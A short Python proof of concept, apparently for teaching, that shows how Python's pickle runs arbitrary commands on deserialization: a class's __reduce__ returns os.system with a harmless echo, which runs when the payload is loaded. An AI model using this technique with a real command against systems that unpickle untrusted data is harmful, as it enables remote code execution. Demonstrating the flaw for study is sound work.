import os
import pickle


class Malicioso:
    def __reduce__(self):
        return (os.system, ("echo ESTO SE EJECUTO AL DESERIALIZAR",))


payload = pickle.dumps(Malicioso())
print(payload)

pickle.loads(payload)
